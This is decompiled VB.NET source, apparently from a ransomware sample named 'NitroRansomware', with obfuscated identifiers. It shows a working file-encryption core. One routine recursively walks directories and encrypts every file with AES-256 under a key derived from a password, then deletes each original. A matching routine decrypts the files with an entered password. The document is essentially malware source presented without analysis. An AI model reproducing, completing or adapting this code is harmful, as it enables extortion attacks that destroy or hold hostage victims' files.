Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports dg3ypDAonQcOidMs0w
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x02000002 RID: 2
	Friend Class Crypto
		' Token: 0x06000002 RID: 2 RVA: 0x000028B8 File Offset: 0x00000AB8
		Public Shared Sub EncryptContent(path As String)
			Try
				For Each text As String In Directory.GetFiles(path)
					If Not text.Contains(Crypto.fExtension) Then
						Crypto.logging.Debug(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(0) + text)
						Crypto.encryptedFileLog.Add(text)
						Crypto.EncryptFile(text, Crypto.fPassword)
					End If
				Next
				For Each text2 As String In Directory.GetDirectories(path)
					Crypto.EncryptContent(text2)
				Next
			Catch ex As Exception
				Crypto.logging.[Error](ex.Message)
			End Try
		End Sub

		' Token: 0x06000003 RID: 3 RVA: 0x00002970 File Offset: 0x00000B70
		Public Shared Sub DecryptContent(path As String)
			Try
				For Each text As String In Directory.GetFiles(path)
					If Crypto.IsEncrypted(text) Then
						Crypto.logging.Debug(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(28) + text)
						Crypto.DecryptFile(text, text.Substring(0, text.Length - Crypto.fExtension.Length), Crypto.inPassword)
					End If
				Next
				For Each text2 As String In Directory.GetDirectories(path)
					Crypto.DecryptContent(text2)
				Next
			Catch ex As Exception
				Crypto.logging.[Error](ex.Message)
			End Try
		End Sub

		' Token: 0x06000004 RID: 4 RVA: 0x00002A2C File Offset: 0x00000C2C
		Private Shared Function IsEncrypted(file As String) As Boolean
			Return file.Contains(Crypto.fExtension) AndAlso file.Substring(file.Length - Crypto.fExtension.Length, Crypto.fExtension.Length) = Crypto.fExtension
		End Function

		' Token: 0x06000005 RID: 5 RVA: 0x00002A7C File Offset: 0x00000C7C
		Private Shared Sub EncryptFile(filePath As String, password As String)
			Dim array As Byte() = New Byte(31) {}
			Dim rngcryptoServiceProvider As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
			For i As Integer = 0 To 10 - 1
				rngcryptoServiceProvider.GetBytes(array)
			Next
			rngcryptoServiceProvider.Dispose()
			Dim fileStream As FileStream = New FileStream(filePath + Crypto.fExtension, FileMode.Create)
			Dim bytes As Byte() = Encoding.UTF8.GetBytes(password)
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
			rijndaelManaged.KeySize = 256
			rijndaelManaged.BlockSize = 128
			rijndaelManaged.Padding = PaddingMode.PKCS7
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(bytes, array, 50000)
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8)
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8)
			rijndaelManaged.Mode = CipherMode.CBC
			fileStream.Write(array, 0, array.Length)
			Dim cryptoStream As CryptoStream = New CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)
			Dim fileStream2 As FileStream = New FileStream(filePath, FileMode.Open)
			Dim array2 As Byte() = New Byte(1048575) {}
			Try
				While True
					Dim num As Integer = fileStream2.Read(array2, 0, array2.Length)
					Dim num2 As Integer = num
					If num <= 0 Then
						Exit For
					End If
					cryptoStream.Write(array2, 0, num2)
				End While
				fileStream2.Close()
			Catch ex As Exception
				Crypto.logging.[Error](ex.Message)
			Finally
				Crypto.logging.Info(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(56) + filePath)
				Crypto.encryptedCount += 1
				cryptoStream.Close()
				fileStream.Close()
				File.Delete(filePath)
			End Try
		End Sub

		' Token: 0x06000006 RID: 6 RVA: 0x00002C0C File Offset: 0x00000E0C
		Private Shared Sub DecryptFile(inputFile As String, outputFile As String, password As String)
			Dim bytes As Byte() = Encoding.UTF8.GetBytes(password)
			Dim array As Byte() = New Byte(31) {}
			Dim fileStream As FileStream = New FileStream(inputFile, FileMode.Open)
			fileStream.Read(array, 0, array.Length)
			Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
			rijndaelManaged.KeySize = 256
			rijndaelManaged.BlockSize = 128
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(bytes, array, 50000)
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8)
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8)
			rijndaelManaged.Padding = PaddingMode.PKCS7
			rijndaelManaged.Mode = CipherMode.CBC
			Dim cryptoStream As CryptoStream = New CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read)
			Dim fileStream2 As FileStream = New FileStream(outputFile, FileMode.Create)
			Dim array2 As Byte() = New Byte(1048575) {}
			Try
				While True
					Dim num As Integer = cryptoStream.Read(array2, 0, array2.Length)
					Dim num2 As Integer = num
					If num <= 0 Then
						Exit For
					End If
					fileStream2.Write(array2, 0, num2)
				End While
			Catch ex As CryptographicException
				Crypto.logging.[Error](WP6RZJql8gZrNhVA9v.L3hoFlcqP6(78) + ex.Message)
			Catch ex2 As Exception
				Crypto.logging.[Error](ex2.Message)
			End Try
			Try
				cryptoStream.Close()
				Crypto.logging.Info(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(142) + inputFile)
			Catch ex3 As Exception
				Crypto.logging.[Error](WP6RZJql8gZrNhVA9v.L3hoFlcqP6(168) + ex3.Message)
			Finally
				fileStream2.Close()
				fileStream.Close()
			End Try
		End Sub

		' Token: 0x06000007 RID: 7 RVA: 0x00002243 File Offset: 0x00000443
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
		End Sub

		' Token: 0x06000008 RID: 8 RVA: 0x00002DB4 File Offset: 0x00000FB4
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			Crypto.encryptedCount = 0
			Crypto.logging = New Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0)
			Crypto.fExtension = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(248)
			Crypto.fPassword = Program.DECRYPT_PASSWORD
			Crypto.encryptedFileLog = New List(Of String)()
		End Sub

		' Token: 0x04000001 RID: 1
		Public Shared encryptedCount As Integer

		' Token: 0x04000002 RID: 2
		Private Shared logging As Logs

		' Token: 0x04000003 RID: 3
		Private Shared fExtension As String

		' Token: 0x04000004 RID: 4
		Public Shared fPassword As String

		' Token: 0x04000005 RID: 5
		Public Shared inPassword As String

		' Token: 0x04000006 RID: 6
		Public Shared encryptedFileLog As List(Of String)
	End Class
End Namespace
